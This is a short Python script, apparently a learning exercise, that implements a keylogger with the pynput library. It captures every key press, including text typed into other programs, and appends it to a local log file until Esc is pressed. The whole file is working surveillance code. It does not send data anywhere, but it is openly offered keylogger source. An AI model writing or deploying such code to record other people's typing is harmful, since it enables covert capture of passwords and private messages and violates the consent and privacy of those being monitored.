from pynput.keyboard import Key, Listener

# Path to the file where the logs will be saved
log_file = "C:/Users/harik/OneDrive/Desktop/prodigy/keylog.txt"

# Function to write keystrokes to the log file
def write_to_file(key):
    with open(log_file, "a") as file:
        key = str(key).replace("'", "")
        if key == 'Key.space':
            file.write(' ')
        elif key == 'Key.enter':
            file.write('\n')
        elif key == 'Key.backspace':
            file.write('[BACKSPACE]')
        elif key == 'Key.shift':
            file.write('[SHIFT]')
        elif key == 'Key.ctrl_l' or key == 'Key.ctrl_r':
            file.write('[CTRL]')
        elif key == 'Key.alt_l' or key == 'Key.alt_r':
            file.write('[ALT]')
        else:
            file.write(key)

# Function to handle each key press
def on_press(key):
    write_to_file(key)

# Function to stop the listener (optional)
def on_release(key):
    if key == Key.esc:
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()